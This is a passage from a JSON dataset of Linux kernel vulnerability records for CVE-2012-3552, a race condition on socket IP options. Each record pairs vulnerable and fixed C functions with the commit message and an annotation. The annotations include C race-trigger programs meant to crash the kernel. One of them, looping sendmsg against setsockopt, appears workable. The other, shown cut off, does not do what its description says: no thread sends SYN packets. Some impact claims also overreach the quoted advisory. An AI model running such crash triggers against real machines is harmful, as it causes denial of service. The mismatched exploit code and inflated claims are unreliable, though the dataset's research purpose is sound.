IP options enabled\n- Launch a background thread rapidly sending SYN packets to the listening socket\n- In the main thread, continuously call setsockopt() to modify socket options on the same socket\n- The kernel's tcp_v4_syn_recv_sock() and setsockopt() handlers run concurrently\n- Race condition causes newinet->opt to reference freed memory, triggering slab corruption\n- System becomes unstable or crashes due to kernel data structure corruption\n\nExploitation Example script payload code:\n```c\n#include <stdio.h>\n#include <string.h>\n#include <unistd.h>\n#include <sys/socket.h>\n#include <netinet/in.h>\n#include <netinet/tcp.h>\n#include <pthread.h>\n\nint listen_sock;\nstruct tcp_md5sig md5sig;\n\nvoid* option_thread(void* arg) {\n    unsigned char key[16] = \"racekey1234567\";\n    int i;\n    for (i = 0; i < 10000; i++) {\n        memset(&md5sig, 0, sizeof(md5sig));\n        md5sig.tcpm_family = AF_INET;\n        md5sig.tcpm_keylen = 14;\n        memcpy(md5sig.tcpm_key, key, 14);\n        setsockopt(listen_sock, IPPROTO_TCP, TCP_MD5SIG, \n                   &md5sig, sizeof(md5sig));\n    }\n    return NULL;\n}\n\nint main() {\n    struct sockaddr_in addr;\n    pthread_t tid;\n    listen_sock = socket(AF_INET, SOCK_STREAM, 0);\n    memset(&addr, 0, sizeof(addr));\n    addr.sin_family = AF_INET;\n    addr.sin_port = htons(9999);\n    bind(listen_sock, (struct sockaddr*)&addr, sizeof(addr));\n    listen(listen_sock, 1);\n    pthread_create(&tid, NULL, option_thread, NULL);\n    sleep(10);\n    close(listen_sock);\n    return 0;\n}\n```\n\nFix\n\nFix code:\n```c\nstruct ip_options_rcu *inet_opt;\n...\ninet_opt = ireq->opt;\nrcu_assign_pointer(newinet->inet_opt, inet_opt);\nireq->opt = NULL;\n...\nif (inet_opt)\n    inet_csk(newsk)->icsk_ext_hdr_len = inet_opt->opt.optlen;\n```\n\nFix summary:\nThe patch introduces RCU (Read-Copy-Update) synchronization for inet->opt access. Instead of direct pointer assignment, it uses rcu_assign_pointer(), providing memory barriers and ordering guarantees that prevent concurrent modification and dereference of the socket option pointer.\n\nPatch reference:\nCommit f6d8bd051c391c1c0458a30b2a7abcd939329259\nhttps://github.com/torvalds/linux/commit/f6d8bd051c391c1c0458a30b2a7abcd939329259\n\nPatch Analysis:\nThe fix adds RCU protection to inet->opt by introducing struct ip_options_rcu wrapper and replacing direct assignment with rcu_assign_pointer(). Readers are required to use rcu_dereference() and proper RCU critical sections. This ensures correct synchronization between the socket option writer (setsockopt path) and readers (TCP connection handler).\n\nPatchType: Synchronization primitive addition (RCU protection for shared pointer resource)\n\nVariant & Triage Guidance\n\nVariant analysis suggestions:\n- Review tcp_ipv6.c for TCPv6 connection handler; likely similar race condition exists in tcp_v6_syn_recv_sock()\n- Search for other unprotected inet->opt or similar socket field assignments in net/core/ and net/ipv*/ without RCU/locking\n- Fuzz socket option setters concurrently with connection acceptance to discover additional races\n\nLikely variants/impact (one line):\nSimilar unsynchronized inet->opt races in IPv6 code path and other socket field assignments likely permit remote DoS via kernel memory corruption.",
        "tests": "NA",
        "solutions": "struct sock *tcp_v4_syn_recv_sock(struct sock *sk, struct sk_buff *skb,\n\t\t\t\t  struct request_sock *req,\n\t\t\t\t  struct dst_entry *dst)\n{\n\tstruct inet_request_sock *ireq;\n\tstruct inet_sock *newinet;\n\tstruct tcp_sock *newtp;\n\tstruct sock *newsk;\n #ifdef CONFIG_TCP_MD5SIG\n \tstruct tcp_md5sig_key *key;\n #endif\n\tstruct ip_options_rcu *inet_opt;\n \n \tif (sk_acceptq_is_full(sk))\n \t\tgoto exit_overflow;\n\n\tif (!dst && (dst = inet_csk_route_req(sk, req)) == NULL)\n\t\tgoto exit;\n\n\tnewsk = tcp_create_openreq_child(sk, req, skb);\n\tif (!newsk)\n\t\tgoto exit_nonewsk;\n\n\tnewsk->sk_gso_type = SKB_GSO_TCPV4;\n\tsk_setup_caps(newsk, dst);\n\n\tnewtp\t\t      = tcp_sk(newsk);\n\tnewinet\t\t      = inet_sk(newsk);\n\tireq\t\t      = inet_rsk(req);\n \tnewinet->inet_daddr   = ireq->rmt_addr;\n \tnewinet->inet_rcv_saddr = ireq->loc_addr;\n \tnewinet->inet_saddr\t      = ireq->loc_addr;\n\tinet_opt\t      = ireq->opt;\n\trcu_assign_pointer(newinet->inet_opt, inet_opt);\n \tireq->opt\t      = NULL;\n \tnewinet->mc_index     = inet_iif(skb);\n \tnewinet->mc_ttl\t      = ip_hdr(skb)->ttl;\n \tinet_csk(newsk)->icsk_ext_hdr_len = 0;\n\tif (inet_opt)\n\t\tinet_csk(newsk)->icsk_ext_hdr_len = inet_opt->opt.optlen;\n \tnewinet->inet_id = newtp->write_seq ^ jiffies;\n \n \ttcp_mtup_init(newsk);\n\ttcp_sync_mss(newsk, dst_mtu(dst));\n\tnewtp->advmss = dst_metric_advmss(dst);\n\tif (tcp_sk(sk)->rx_opt.user_mss &&\n\t    tcp_sk(sk)->rx_opt.user_mss < newtp->advmss)\n\t\tnewtp->advmss = tcp_sk(sk)->rx_opt.user_mss;\n\n\ttcp_initialize_rcv_mss(newsk);\n\n#ifdef CONFIG_TCP_MD5SIG\n\t/* Copy over the MD5 key from the original socket */\n\tkey = tcp_v4_md5_do_lookup(sk, newinet->inet_daddr);\n\tif (key != NULL) {\n\t\t/*\n\t\t * We're using one, so create a matching key\n\t\t * on the newsk structure. If we fail to get\n\t\t * memory, then we end up not copying the key\n\t\t * across. Shucks.\n\t\t */\n\t\tchar *newkey = kmemdup(key->key, key->keylen, GFP_ATOMIC);\n\t\tif (newkey != NULL)\n\t\t\ttcp_v4_md5_do_add(newsk, newinet->inet_daddr,\n\t\t\t\t\t  newkey, key->keylen);\n\t\tsk_nocaps_add(newsk, NETIF_F_GSO_MASK);\n\t}\n#endif\n\n\tif (__inet_inherit_port(sk, newsk) < 0) {\n\t\tsock_put(newsk);\n\t\tgoto exit;\n\t}\n\t__inet_hash_nolisten(newsk, NULL);\n\n\treturn newsk;\n\nexit_overflow:\n\tNET_INC_STATS_BH(sock_net(sk), LINUX_MIB_LISTENOVERFLOWS);\nexit_nonewsk:\n\tdst_release(dst);\nexit:\n\tNET_INC_STATS_BH(sock_net(sk), LINUX_MIB_LISTENDROPS);\n\treturn NULL;\n}\n",
        "Publish Date": "2012-10-03",
        "Update Date": "2013-10-11",
        "Vulnerability type": "DoS ",
        "commit_url": "https://github.com/torvalds/linux/commit/f6d8bd051c391c1c0458a30b2a7abcd939329259",
        "commit_id": "f6d8bd051c391c1c0458a30b2a7abcd939329259",
        "commit_message": "inet: add RCU protection to inet->opt\n\nWe lack proper synchronization to manipulate inet->opt ip_options\n\nProblem is ip_make_skb() calls ip_setup_cork() and\nip_setup_cork() possibly makes a copy of ipc->opt (struct ip_options),\nwithout any protection against another thread manipulating inet->opt.\n\nAnother thread can change inet->opt pointer and free old one under us.\n\nUse RCU to protect inet->opt (changed to inet->inet_opt).\n\nInstead of handling atomic refcounts, just copy ip_options when\nnecessary, to avoid cache line dirtying.\n\nWe cant insert an rcu_head in struct ip_options since its included in\nskb->cb[], so this patch is large because I had to introduce a new\nip_options_rcu structure.\n\nSigned-off-by: Eric Dumazet <eric.dumazet@gmail.com>\nCc: Herbert Xu <herbert@gondor.apana.org.au>\nSigned-off-by: David S. Miller <davem@davemloft.net>",
        "project": "linux"
    },
    {
        "vulnerable": 1,
        "snippet_type": "function",
        "CWE": "CWE-362",
        "CVE": "CVE-2012-3552",
        "language": "C",
        "synthetic": "0",
        "source": "BigVul",
        "source_link": "https://huggingface.co/datasets/bstee615/bigvul",
        "files": {
            "net/ipv4/udp.c": "int udp_sendmsg(struct kiocb *iocb, struct sock *sk, struct msghdr *msg,\n\t\tsize_t len)\n{\n\tstruct inet_sock *inet = inet_sk(sk);\n\tstruct udp_sock *up = udp_sk(sk);\n\tstruct flowi4 *fl4;\n\tint ulen = len;\n\tstruct ipcm_cookie ipc;\n\tstruct rtable *rt = NULL;\n\tint free = 0;\n\tint connected = 0;\n\t__be32 daddr, faddr, saddr;\n\t__be16 dport;\n\tu8  tos;\n\tint err, is_udplite = IS_UDPLITE(sk);\n \tint corkreq = up->corkflag || msg->msg_flags&MSG_MORE;\n \tint (*getfrag)(void *, char *, int, int, int, struct sk_buff *);\n \tstruct sk_buff *skb;\n \n \tif (len > 0xFFFF)\n \t\treturn -EMSGSIZE;\n\n\t/*\n\t *\tCheck the flags.\n\t */\n\n\tif (msg->msg_flags & MSG_OOB) /* Mirror BSD error message compatibility */\n\t\treturn -EOPNOTSUPP;\n\n\tipc.opt = NULL;\n\tipc.tx_flags = 0;\n\n\tgetfrag = is_udplite ? udplite_getfrag : ip_generic_getfrag;\n\n\tif (up->pending) {\n\t\t/*\n\t\t * There are pending frames.\n\t\t * The socket lock must be held while it's corked.\n\t\t */\n\t\tlock_sock(sk);\n\t\tif (likely(up->pending)) {\n\t\t\tif (unlikely(up->pending != AF_INET)) {\n\t\t\t\trelease_sock(sk);\n\t\t\t\treturn -EINVAL;\n\t\t\t}\n\t\t\tgoto do_append_data;\n\t\t}\n\t\trelease_sock(sk);\n\t}\n\tulen += sizeof(struct udphdr);\n\n\t/*\n\t *\tGet and verify the address.\n\t */\n\tif (msg->msg_name) {\n\t\tstruct sockaddr_in * usin = (struct sockaddr_in *)msg->msg_name;\n\t\tif (msg->msg_namelen < sizeof(*usin))\n\t\t\treturn -EINVAL;\n\t\tif (usin->sin_family != AF_INET) {\n\t\t\tif (usin->sin_family != AF_UNSPEC)\n\t\t\t\treturn -EAFNOSUPPORT;\n\t\t}\n\n\t\tdaddr = usin->sin_addr.s_addr;\n\t\tdport = usin->sin_port;\n\t\tif (dport == 0)\n\t\t\treturn -EINVAL;\n\t} else {\n\t\tif (sk->sk_state != TCP_ESTABLISHED)\n\t\t\treturn -EDESTADDRREQ;\n\t\tdaddr = inet->inet_daddr;\n\t\tdport = inet->inet_dport;\n\t\t/* Open fast path for connected socket.\n\t\t   Route will not be used, if at least one option is set.\n\t\t */\n\t\tconnected = 1;\n\t}\n\tipc.addr = inet->inet_saddr;\n\n\tipc.oif = sk->sk_bound_dev_if;\n\terr = sock_tx_timestamp(sk, &ipc.tx_flags);\n\tif (err)\n\t\treturn err;\n\tif (msg->msg_controllen) {\n\t\terr = ip_cmsg_send(sock_net(sk), msg, &ipc);\n\t\tif (err)\n\t\t\treturn err;\n\t\tif (ipc.opt)\n \t\t\tfree = 1;\n \t\tconnected = 0;\n \t}\n\tif (!ipc.opt)\n\t\tipc.opt = inet->opt;\n \n \tsaddr = ipc.addr;\n \tipc.addr = faddr = daddr;\n \n\tif (ipc.opt && ipc.opt->srr) {\n \t\tif (!daddr)\n \t\t\treturn -EINVAL;\n\t\tfaddr = ipc.opt->faddr;\n \t\tconnected = 0;\n \t}\n \ttos = RT_TOS(inet->tos);\n \tif (sock_flag(sk, SOCK_LOCALROUTE) ||\n \t    (msg->msg_flags & MSG_DONTROUTE) ||\n\t    (ipc.opt && ipc.opt->is_strictroute)) {\n \t\ttos |= RTO_ONLINK;\n \t\tconnected = 0;\n \t}\n\n\tif (ipv4_is_multicast(daddr)) {\n\t\tif (!ipc.oif)\n\t\t\tipc.oif = inet->mc_index;\n\t\tif (!saddr)\n\t\t\tsaddr = inet->mc_addr;\n\t\tconnected = 0;\n\t}\n\n\tif (connected)\n\t\trt = (struct rtable *)sk_dst_check(sk, 0);\n\n\tif (rt == NULL) {\n\t\tstruct flowi4 fl4;\n\t\tstruct net *net = sock_net(sk);\n\n\t\tflowi4_init_output(&fl4, ipc.oif, sk->sk_mark, tos,\n\t\t\t\t   RT_SCOPE_UNIVERSE, sk->sk_protocol,\n\t\t\t\t   inet_sk_flowi_flags(sk)|FLOWI_FLAG_CAN_SLEEP,\n\t\t\t\t   faddr, saddr, dport, inet->inet_sport);\n\n\t\tsecurity_sk_classify_flow(sk, flowi4_to_flowi(&fl4));\n\t\trt = ip_route_output_flow(net, &fl4, sk);\n\t\tif (IS_ERR(rt)) {\n\t\t\terr = PTR_ERR(rt);\n\t\t\trt = NULL;\n\t\t\tif (err == -ENETUNREACH)\n\t\t\t\tIP_INC_STATS_BH(net, IPSTATS_MIB_OUTNOROUTES);\n\t\t\tgoto out;\n\t\t}\n\n\t\terr = -EACCES;\n\t\tif ((rt->rt_flags & RTCF_BROADCAST) &&\n\t\t    !sock_flag(sk, SOCK_BROADCAST))\n\t\t\tgoto out;\n\t\tif (connected)\n\t\t\tsk_dst_set(sk, dst_clone(&rt->dst));\n\t}\n\n\tif (msg->msg_flags&MSG_CONFIRM)\n\t\tgoto do_confirm;\nback_from_confirm:\n\n\tsaddr = rt->rt_src;\n\tif (!ipc.addr)\n\t\tdaddr = ipc.addr = rt->rt_dst;\n\n\t/* Lockless fast path for the non-corking case. */\n\tif (!corkreq) {\n\t\tskb = ip_make_skb(sk, getfrag, msg->msg_iov, ulen,\n\t\t\t\t  sizeof(struct udphdr), &ipc, &rt,\n\t\t\t\t  msg->msg_flags);\n\t\terr = PTR_ERR(skb);\n\t\tif (skb && !IS_ERR(skb))\n\t\t\terr = udp_send_skb(skb, daddr, dport);\n\t\tgoto out;\n\t}\n\n\tlock_sock(sk);\n\tif (unlikely(up->pending)) {\n\t\t/* The socket is already corked while preparing it. */\n\t\t/* ... which is an evident application bug. --ANK */\n\t\trelease_sock(sk);\n\n\t\tLIMIT_NETDEBUG(KERN_DEBUG \"udp cork app bug 2\\n\");\n\t\terr = -EINVAL;\n\t\tgoto out;\n\t}\n\t/*\n\t *\tNow cork the socket to pend data.\n\t */\n\tfl4 = &inet->cork.fl.u.ip4;\n\tfl4->daddr = daddr;\n\tfl4->saddr = saddr;\n\tfl4->fl4_dport = dport;\n\tfl4->fl4_sport = inet->inet_sport;\n\tup->pending = AF_INET;\n\ndo_append_data:\n\tup->len += ulen;\n\terr = ip_append_data(sk, getfrag, msg->msg_iov, ulen,\n\t\t\tsizeof(struct udphdr), &ipc, &rt,\n\t\t\tcorkreq ? msg->msg_flags|MSG_MORE : msg->msg_flags);\n\tif (err)\n\t\tudp_flush_pending_frames(sk);\n\telse if (!corkreq)\n\t\terr = udp_push_pending_frames(sk);\n\telse if (unlikely(skb_queue_empty(&sk->sk_write_queue)))\n\t\tup->pending = 0;\n\trelease_sock(sk);\n\nout:\n\tip_rt_put(rt);\n\tif (free)\n\t\tkfree(ipc.opt);\n\tif (!err)\n\t\treturn len;\n\t/*\n\t * ENOBUFS = no kernel mem, SOCK_NOSPACE = no sndbuf space.  Reporting\n\t * ENOBUFS might not be good (it's not tunable per se), but otherwise\n\t * we don't have a good statistic (IpOutDiscards but it can be too many\n\t * things).  We could add another new stat but at least for now that\n\t * seems like overkill.\n\t */\n\tif (err == -ENOBUFS || test_bit(SOCK_NOSPACE, &sk->sk_socket->flags)) {\n\t\tUDP_INC_STATS_USER(sock_net(sk),\n\t\t\t\tUDP_MIB_SNDBUFERRORS, is_udplite);\n\t}\n\treturn err;\n\ndo_confirm:\n\tdst_confirm(&rt->dst);\n\tif (!(msg->msg_flags&MSG_PROBE) || len)\n\t\tgoto back_from_confirm;\n\terr = 0;\n\tgoto out;\n}\n"
        },
        "vulnerabilities": "Race condition in the IP implementation in the Linux kernel before 3.0 might allow remote attackers to cause a denial of service (slab corruption and system crash) by sending packets to an application that sets socket options during the handling of network traffic.",
        "annotation": "[Mandatory] ID:\nCVE-2012-3552\n\n[Mandatory] Title: CVE-2012-3552 / CWE-362:\nRace condition in UDP socket options handling\n\n[Optional] Disclosure / Patch Dates:\nInitial advisory: 2012-10-03 \u2014 Patch release: 2012-09-29\n\n[Optional] Affected products/versions:\nLinux kernel before 3.0\n\nThe Vulnerability\n[Optional] CWE/CVE Number and description:\nCWE-362: Concurrent Modification of Shared Resource Without Synchronization (\"Race Condition\")\n\n[Mandatory] Summary:\nA race condition exists in the UDP socket implementation (net/ipv4/udp.c, udp_sendmsg function) where the kernel accesses inet->opt (socket IP options) without proper synchronization. While one thread is sending a UDP packet and reading socket options via ip_setup_cork(), another thread can simultaneously modify or free inet->opt. This unsynchronized concurrent access to the shared inet->opt pointer causes slab corruption and kernel panic. The vulnerability is triggered by sending network packets to an application that modifies socket options (via setsockopt) concurrently with UDP transmission.\n\n[Mandatory] Root cause:\nThe inet->opt pointer is accessed and dereferenced in udp_sendmsg without RCU locking or other synchronization, allowing concurrent modification or deallocation by another thread setting socket options.\n\n[Mandatory] Attack Surface:\nNetwork socket layer; UDP protocol handler; kernel IP options processing\n\n[Mandatory] Impact Summary:\nDenial of service via slab corruption and system crash (kernel panic)\n\n[Optional] Trigger / Attack vector:\nConcurrent socket operations: UDP packet transmission (sendmsg) combined with socket option modification (setsockopt) from a different thread\n\n[Mandatory] Key code/struct excerpt (minimal):\n```c\nif (!ipc.opt)\n    ipc.opt = inet->opt;\n\nif (ipc.opt && ipc.opt->srr) {\n    if (!daddr)\n        return -EINVAL;\n    faddr = ipc.opt->faddr;\n    connected = 0;\n}\n```\n\nExploit:\n[Mandatory] Trigger surface/attack vector:\nSocket option setting (setsockopt/IP_OPTIONS) concurrent with UDP datagram transmission (sendto/sendmsg)\n\n[Mandatory] Exploit primitive(s) available:\nRace condition leading to use-after-free or invalid pointer dereference in kernel memory; kernel heap corruption; arbitrary kernel memory access via corrupted ipc.opt structure\n\n[Mandatory] Exploitability summary:\nThe race is exploitable with moderate effort by spawning multiple threads: one continuously sending UDP packets while another repeatedly modifies socket options, increasing collision probability until kernel crash occurs.\n\n[Mandatory] Exploit script (summary, 3\u20136 bullets):\n- Create a UDP socket and optionally connect it to a destination\n- Spawn two threads: Thread A repeatedly calls sendmsg (or sendto) with varying message sizes; Thread B repeatedly calls setsockopt(IP_OPTIONS) to change socket options\n- The race condition occurs when Thread A reads inet->opt in udp_sendmsg while Thread B modifies or frees it via setsockopt\n- Corrupted ipc.opt pointer or stale reference causes out-of-bounds memory access when accessed later (e.g., ipc.opt->srr, ipc.opt->faddr check)\n- Eventual kernel panic due to slab corruption or NULL/invalid pointer dereference\n\n[Mandatory] Exploitation Example script payload code:\n```c\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <pthread.h>\n#include <sys/socket.h>\n#include <netinet/in.h>\n\nvoid* sendmsg_thread(void* arg) {\n    int sock = *(int*)arg;\n    struct sockaddr_in addr;\n    char data[256];\n    while (1) {\n        struct msghdr msg;\n        struct iovec iov;\n        memset(&msg, 0, sizeof(msg));\n        memset(&addr, 0, sizeof(addr));\n        addr.sin_family = AF_INET;\n        addr.sin_port = htons(5555);\n        addr.sin_addr.s_addr = htonl(0x7f000001);\n        iov.iov_base = data;\n        iov.iov_len = rand() % 256;\n        msg.msg_iov = &iov;\n        msg.msg_iovlen = 1;\n        msg.msg_name = &addr;\n        msg.msg_namelen = sizeof(addr);\n        sendmsg(sock, &msg, 0);\n    }\n    return NULL;\n}\n\nvoid* setsockopt_thread(void* arg) {\n    int sock = *(int*)arg;\n    unsigned char opt[256];\n    while (1) {\n        memset(opt, 0, sizeof(opt));\n        opt[0] = IPOPT_RR;\n        opt[1] = rand() % 32;\n        setsockopt(sock, IPPROTO_IP, IP_OPTIONS, opt, opt[1] + 2);\n    }\n    return NULL;\n}\n\nint main() {\n    int sock = socket(AF_INET, SOCK_DGRAM, 0);\n    pthread_t t1, t2;\n    pthread_create(&t1, NULL, sendmsg_thread, &sock);\n    pthread_create(&t2, NULL, setsockopt_thread, &sock);\n    pthread_join(t1, NULL);\n    return 0;\n}\n```\n\nFix\n[Mandatory] Fix code:\n```c\nstruct ip_options_data opt_copy;\n\nif (!ipc.opt) {\n    struct ip_options_rcu *inet_opt;\n    \n    rcu_read_lock();\n    inet_opt = rcu_dereference(inet->inet_opt);\n    if (inet_opt) {\n        memcpy(&opt_copy, inet_opt,\n               sizeof(*inet_opt) + inet_opt->opt.optlen);\n        ipc.opt = &opt_copy.opt;\n    }\n    rcu_read_unlock();\n}\n\nif (ipc.opt && ipc.opt->opt.srr) {\n    if (!daddr)\n        return -EINVAL;\n    faddr = ipc.opt->opt.faddr;\n    connected = 0;\n}\n```\n\n[Mandatory] Fix summary:\nThe patch wraps inet->opt access with RCU read-side locking (rcu_read_lock/rcu_read_unlock) and makes a local copy of the ip_options structure into opt_copy. This ensures that even if another thread modifies inet->opt, the current udp_sendmsg has a stable, consistent copy that cannot be freed or corrupted concurrently. The RCU mechanism allows safe concurrent reads without atomic refcounting overhead.\n\n[Optional] Patch reference:\nCommit: f6d8bd051c391c1c0458a30b2a7abcd939329259\nURL: https://github.com/torvalds/linux/commit/f6d8bd051c391c1c0458a30b2a7abcd939329259\nCommit message: \"inet: add RCU protection to inet->opt\"\n\n[Optional] Patch Analysis:\nThe fix replaced unsynchronized direct pointer access (ipc.opt = inet->opt) with RCU-protected concurrent-read semantics: rcu_read_lock protects the read of inet->inet_opt, rcu_dereference ensures correct memory ordering, and memcpy creates a private stack-allocated copy. This prevents use-after-free and ensures consistency across the function's execution. The fix changed inet->opt to inet->inet_opt and introduced ip_options_rcu wrapper.\n\nPatchType: Synchronization mechanism (RCU locking + data copying) added to protect shared resource access\n\n[Optional] Variant & Triage Guidance\n\n[Optional] Variant analysis suggestions (2\u20133 bullets):\n- Review other kernel network socket handlers (TCP, SCTP, DCCP) for similar unsynchronized access to inet->opt or other socket state shared between sendmsg and setsockopt paths\n- Audit all code paths that read inet->opt without RCU or other locking mechanisms pre-3.0; check if similar RCU conversion was applied consistently\n- Fuzz concurrent socket operations (sendmsg + setsockopt, sendto + setsockopt) on various socket types to detect similar race conditions in the IP layer\n\n[Optional] Likely variants/impact (one line):\nSimilar race conditions likely exist in other socket option accesses (inet->tos, inet->mc_addr, etc.) if accessed outside of socket lock in concurrent code paths.",
        "tests": "NA",
        "solutions": "int udp_sendmsg(struct kiocb *iocb, struct sock *sk, struct msghdr *msg,\n\t\tsize_t len)\n{\n\tstruct inet_sock *inet = inet_sk(sk);\n\tstruct udp_sock *up = udp_sk(sk);\n\tstruct flowi4 *fl4;\n\tint ulen = len;\n\tstruct ipcm_cookie ipc;\n\tstruct rtable *rt = NULL;\n\tint free = 0;\n\tint connected = 0;\n\t__be32 daddr, faddr, saddr;\n\t__be16 dport;\n\tu8  tos;\n\tint err, is_udplite = IS_UDPLITE(sk);\n \tint corkreq = up->corkflag || msg->msg_flags&MSG_MORE;\n \tint (*getfrag)(void *, char *, int, int, int, struct sk_buff *);\n \tstruct sk_buff *skb;\n\tstruct ip_options_data opt_copy;\n \n \tif (len > 0xFFFF)\n \t\treturn -EMSGSIZE;\n\n\t/*\n\t *\tCheck the flags.\n\t */\n\n\tif (msg->msg_flags & MSG_OOB) /* Mirror BSD error message compatibility */\n\t\treturn -EOPNOTSUPP;\n\n\tipc.opt = NULL;\n\tipc.tx_flags = 0;\n\n\tgetfrag = is_udplite ? udplite_getfrag : ip_generic_getfrag;\n\n\tif (up->pending) {\n\t\t/*\n\t\t * There are pending frames.\n\t\t * The socket lock must be held while it's corked.\n\t\t */\n\t\tlock_sock(sk);\n\t\tif (likely(up->pending)) {\n\t\t\tif (unlikely(up->pending != AF_INET)) {\n\t\t\t\trelease_sock(sk);\n\t\t\t\treturn -EINVAL;\n\t\t\t}\n\t\t\tgoto do_append_data;\n\t\t}\n\t\trelease_sock(sk);\n\t}\n\tulen += sizeof(struct udphdr);\n\n\t/*\n\t *\tGet and verify the address.\n\t */\n\tif (msg->msg_name) {\n\t\tstruct sockaddr_in * usin = (struct sockaddr_in *)msg->msg_name;\n\t\tif (msg->msg_namelen < sizeof(*usin))\n\t\t\treturn -EINVAL;\n\t\tif (usin->sin_family != AF_INET) {\n\t\t\tif (usin->sin_family != AF_UNSPEC)\n\t\t\t\treturn -EAFNOSUPPORT;\n\t\t}\n\n\t\tdaddr = usin->sin_addr.s_addr;\n\t\tdport = usin->sin_port;\n\t\tif (dport == 0)\n\t\t\treturn -EINVAL;\n\t} else {\n\t\tif (sk->sk_state != TCP_ESTABLISHED)\n\t\t\treturn -EDESTADDRREQ;\n\t\tdaddr = inet->inet_daddr;\n\t\tdport = inet->inet_dport;\n\t\t/* Open fast path for connected socket.\n\t\t   Route will not be used, if at least one option is set.\n\t\t */\n\t\tconnected = 1;\n\t}\n\tipc.addr = inet->inet_saddr;\n\n\tipc.oif = sk->sk_bound_dev_if;\n\terr = sock_tx_timestamp(sk, &ipc.tx_flags);\n\tif (err)\n\t\treturn err;\n\tif (msg->msg_controllen) {\n\t\terr = ip_cmsg_send(sock_net(sk), msg, &ipc);\n\t\tif (err)\n\t\t\treturn err;\n\t\tif (ipc.opt)\n \t\t\tfree = 1;\n \t\tconnected = 0;\n \t}\n\tif (!ipc.opt) {\n\t\tstruct ip_options_rcu *inet_opt;\n\n\t\trcu_read_lock();\n\t\tinet_opt = rcu_dereference(inet->inet_opt);\n\t\tif (inet_opt) {\n\t\t\tmemcpy(&opt_copy, inet_opt,\n\t\t\t       sizeof(*inet_opt) + inet_opt->opt.optlen);\n\t\t\tipc.opt = &opt_copy.opt;\n\t\t}\n\t\trcu_read_unlock();\n\t}\n \n \tsaddr = ipc.addr;\n \tipc.addr = faddr = daddr;\n \n\tif (ipc.opt && ipc.opt->opt.srr) {\n \t\tif (!daddr)\n \t\t\treturn -EINVAL;\n\t\tfaddr = ipc.opt->opt.faddr;\n \t\tconnected = 0;\n \t}\n \ttos = RT_TOS(inet->tos);\n \tif (sock_flag(sk, SOCK_LOCALROUTE) ||\n \t    (msg->msg_flags & MSG_DONTROUTE) ||\n\t    (ipc.opt && ipc.opt->opt.is_strictroute)) {\n \t\ttos |= RTO_ONLINK;\n \t\tconnected = 0;\n \t}\n\n\tif (ipv4_is_multicast(daddr)) {\n\t\tif (!ipc.oif)\n\t\t\tipc.oif = inet->mc_index;\n\t\tif (!saddr)\n\t\t\tsaddr = inet->mc_addr;\n\t\tconnected = 0;\n\t}\n\n\tif (connected)\n\t\trt = (struct rtable *)sk_dst_check(sk, 0);\n\n\tif (rt == NULL) {\n\t\tstruct flowi4 fl4;\n\t\tstruct net *net = sock_net(sk);\n\n\t\tflowi4_init_output(&fl4, ipc.oif, sk->sk_mark, tos,\n\t\t\t\t   RT_SCOPE_UNIVERSE, sk->sk_protocol,\n\t\t\t\t   inet_sk_flowi_flags(sk)|FLOWI_FLAG_CAN_SLEEP,\n\t\t\t\t   faddr, saddr, dport, inet->inet_sport);\n\n\t\tsecurity_sk_classify_flow(sk, flowi4_to_flowi(&fl4));\n\t\trt = ip_route_output_flow(net, &fl4, sk);\n\t\tif (IS_ERR(rt)) {\n\t\t\terr = PTR_ERR(rt);\n\t\t\trt = NULL;\n\t\t\tif (err == -ENETUNREACH)\n\t\t\t\tIP_INC_STATS_BH(net, IPSTATS_MIB_OUTNOROUTES);\n\t\t\tgoto out;\n\t\t}\n\n\t\terr = -EACCES;\n\t\tif ((rt->rt_flags & RTCF_BROADCAST) &&\n\t\t    !sock_flag(sk, SOCK_BROADCAST))\n\t\t\tgoto out;\n\t\tif (connected)\n\t\t\tsk_dst_set(sk, dst_clone(&rt->dst));\n\t}\n\n\tif (msg->msg_flags&MSG_CONFIRM)\n\t\tgoto do_confirm;\nback_from_confirm:\n\n\tsaddr = rt->rt_src;\n\tif (!ipc.addr)\n\t\tdaddr = ipc.addr = rt->rt_dst;\n\n\t/* Lockless fast path for the non-corking case. */\n\tif (!corkreq) {\n\t\tskb = ip_make_skb(sk, getfrag, msg->msg_iov, ulen,\n\t\t\t\t  sizeof(struct udphdr), &ipc, &rt,\n\t\t\t\t  msg->msg_flags);\n\t\terr = PTR_ERR(skb);\n\t\tif (skb && !IS_ERR(skb))\n\t\t\terr = udp_send_skb(skb, daddr, dport);\n\t\tgoto out;\n\t}\n\n\tlock_sock(sk);\n\tif (unlikely(up->pending)) {\n\t\t/* The socket is already corked while preparing it. */\n\t\t/* ... which is an evident application bug. --ANK */\n\t\trelease_sock(sk);\n\n\t\tLIMIT_NETDEBUG(KERN_DEBUG \"udp cork app bug 2\\n\");\n\t\terr = -EINVAL;\n\t\tgoto out;\n\t}\n\t/*\n\t *\tNow cork the socket to pend data.\n\t */\n\tfl4 = &inet->cork.fl.u.ip4;\n\tfl4->daddr = daddr;\n\tfl4->saddr = saddr;\n\tfl4->fl4_dport = dport;\n\tfl4->fl4_sport = inet->inet_sport;\n\tup->pending = AF_INET;\n\ndo_append_data:\n\tup->len += ulen;\n\terr = ip_append_data(sk, getfrag, msg->msg_iov, ulen,\n\t\t\tsizeof(struct udphdr), &ipc, &rt,\n\t\t\tcorkreq ? msg->msg_flags|MSG_MORE : msg->msg_flags);\n\tif (err)\n\t\tudp_flush_pending_frames(sk);\n\telse if (!corkreq)\n\t\terr = udp_push_pending_frames(sk);\n\telse if (unlikely(skb_queue_empty(&sk->sk_write_queue)))\n\t\tup->pending = 0;\n\trelease_sock(sk);\n\nout:\n\tip_rt_put(rt);\n\tif (free)\n\t\tkfree(ipc.opt);\n\tif (!err)\n\t\treturn len;\n\t/*\n\t * ENOBUFS = no kernel mem, SOCK_NOSPACE = no sndbuf space.  Reporting\n\t * ENOBUFS might not be good (it's not tunable per se), but otherwise\n\t * we don't have a good statistic (IpOutDiscards but it can be too many\n\t * things).  We could add another new stat but at least for now that\n\t * seems like overkill.\n\t */\n\tif (err == -ENOBUFS || test_bit(SOCK_NOSPACE, &sk->sk_socket->flags)) {\n\t\tUDP_INC_STATS_USER(sock_net(sk),\n\t\t\t\tUDP_MIB_SNDBUFERRORS, is_udplite);\n\t}\n\treturn err;\n\ndo_confirm:\n\tdst_confirm(&rt->dst);\n\tif (!(msg->msg_flags&MSG_PROBE) || len)\n\t\tgoto back_from_confirm;\n\terr = 0;\n\tgoto out;\n}\n",
        "Publish Date": "2012-10-03",
        "Update Date": "2013-10-11",
        "Vulnerability type": "DoS ",
